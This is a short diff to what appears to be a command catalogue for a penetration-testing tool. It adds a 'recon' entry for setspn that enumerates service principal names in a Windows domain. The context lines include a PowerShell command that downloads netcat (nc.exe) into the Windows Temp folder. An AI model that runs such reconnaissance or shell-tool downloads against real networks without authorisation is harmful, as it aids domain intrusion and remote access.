@@ -116,6 +116,18 @@ examples = [
     "powershell wget -Uri http://127.0.0.1/nc.exe -OutFile C:/Windows/Temp/nc.exe"
 ]
 
+# ====== RECON COMMANDS ======
+# ============================ #
+[command.SPN-0]
+use_name = "setspn"
+local = false
+cmd_types = "recon"
+args = "setspn -T <domain|domain.corp> -Q <spn-wildcard|*/*>"
+short_desc = "Search for spn in the domain"
+examples = [
+    "setspn -T corp -Q MSSQLSvc/*"
+]
+
 
 # ===== SYSADMIN COMMANDS =====
 # ============================ #
